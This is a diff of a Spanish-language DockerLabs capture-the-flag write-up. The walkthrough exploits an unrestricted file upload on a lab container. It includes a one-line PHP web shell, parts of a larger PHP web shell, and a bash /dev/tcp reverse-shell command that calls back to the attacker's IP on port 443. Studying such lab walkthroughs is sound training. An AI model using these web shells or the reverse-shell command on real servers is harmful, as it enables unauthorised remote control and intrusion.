@@ -3,11 +3,11 @@ Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
 Dificultad: Facil
-VectorInicial: Unrestricted File Upload ÔåÆ RCE
+VectorInicial: Unrestricted File Upload → RCE
 Privesc: sudo env
 Fecha: 2026-02-04
 ---
-<img width="927" height="559" alt="Pasted image 20260203193639" src="https://github.com/user-attachments/assets/b76b81e7-698a-4d05-b63b-587e78048c8e" />
+![[attachments/Pasted image 20260203193639.png]]
 
 Lo primero que realizaremos es un escaneo de puertos hacia la IP de la maquina para ver que servicios corren:
 
@@ -17,21 +17,21 @@ nmap -sSVC -n -Pn 172.17.0.2
 
 Con lo que obtenemos que solo esta abierto el puerto 80:
 
-<img width="853" height="341" alt="Pasted image 20260203194025" src="https://github.com/user-attachments/assets/2f1db8aa-18f6-45ef-a39d-1e5da441b32f" />
+![[attachments/Pasted image 20260203194025.png]]
 
-Procedemos a ver que hay en dicha direcci├│n desde el navegador
+Procedemos a ver que hay en dicha dirección desde el navegador
 
-<img width="417" height="223" alt="Pasted image 20260203194138" src="https://github.com/user-attachments/assets/d9799e5b-f218-44ff-bdb7-74e62189ae3a" />
+![[attachments/Pasted image 20260203194138.png]]
 
-Solo hay una opci├│n para subir ficheros, as├¡ que probaremos a subir un fichero para obtener una webshell o un basic rce.
+Solo hay una opción para subir ficheros, así que probaremos a subir un fichero para obtener una webshell o un basic rce.
 
-Para un basi rce podemos usar el siguiente c├│digo en un fichero **shell.php**
+Para un basi rce podemos usar el siguiente código en un fichero **shell.php**
 
 ```php
 <?php system($_GET["cmd"]);?>
 ```
 
-Para un webshell usaremos el siguiente c├│digo en un fichero shell.php
+Para un webshell usaremos el siguiente código en un fichero shell.php
 
 ```php
 <?php
@@ -496,7 +496,7 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = "ÔÇª/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
+                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
                 return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
@@ -643,29 +643,29 @@ if (isset($_GET["feature"])) {
 
 El fichero se sube sin problemas pero no indica en la carpeta que se alojo el fichero
 
-<img width="379" height="242" alt="Pasted image 20260203194848" src="https://github.com/user-attachments/assets/3f7c51f3-4ac7-4df6-8753-112c6e2d499b" />
+![[attachments/Pasted image 20260203194848.png]]
 
 Ahora tendremos que realizar un descubrimiento de directorios para ver donde esta alojado el fichero.
 
-Con la aplicaci├│n de **dirb** ha sido suficiente para encontrar el directorio don se alojan las subidas
+Con la aplicación de **dirb** ha sido suficiente para encontrar el directorio don se alojan las subidas
 
 ```bash
 dirb http://172.17.0.2
 ```
 
-<img width="519" height="519" alt="Pasted image 20260203195208" src="https://github.com/user-attachments/assets/91a877b9-1c77-41ce-8824-1daea3186480" />
+![[attachments/Pasted image 20260203195208.png]]
 
 Ahora nos dirigimos a la url  http://172.17.0.2/uploads para ver si encontramos nuestro fichero.
 
-<img width="485" height="220" alt="Pasted image 20260203195418" src="https://github.com/user-attachments/assets/4d56daeb-8199-47bd-83e8-213c17776ff0" />
+![[attachments/Pasted image 20260203195418.png]]
 
-Y aqu├¡ tenemos nuestro fichero, ahora solo tenemos que pulsar en el para obtener una Webshell
+Y aquí tenemos nuestro fichero, ahora solo tenemos que pulsar en el para obtener una Webshell
 
-<img width="1835" height="841" alt="Pasted image 20260203195511" src="https://github.com/user-attachments/assets/009b3699-1fde-457f-939a-650011583a7f" />
+![[attachments/Pasted image 20260203195511.png]]
 
 Y ya estamos dentro de la maquina y comprobamos si podemos escalar privilegios, pero desafortunadamente desde la Webshell no podemos hacer una escalada de privilegios.
 
-<img width="1036" height="216" alt="Pasted image 20260203200458" src="https://github.com/user-attachments/assets/b70e431b-e813-4252-a64c-0cfef5d39d13" />
+![[attachments/Pasted image 20260203200458.png]]
 
 Por este motivo intentaremos realizar un reverseshell con el siguiente comando ejecutado en webshell
 
@@ -675,14 +675,8 @@ bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
 
 Mientras escuchamos en el puerto 443 desde penelope y obtenemos el acceso a la maquina
 
-<img width="852" height="488" alt="Pasted image 20260203201019" src="https://github.com/user-attachments/assets/7564e8a4-e609-4bcb-a1d3-1fa09253c4dd" />
+![[attachments/Pasted image 20260203201019.png]]
 
-# Conclusi├│n
+# Conclusión
 
-Con este CTF vemos como se puede realizar un RFI (Remote File Inclusion) al no encontrase sanitizado el formulario de subida de archivos y los peligros que esto puede conllevar.
-
----
-Si te gusto puedes invitarme a un cafe.
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
-
-
+Con este CTF vemos como se puede realizar una vulnerabilidad de subida de archivos sin validación que permite la ejecución remota de código (RCE) mediante una webshell al no encontrase sanitizado el formulario de subida de archivos y los peligros que esto puede conllevar.
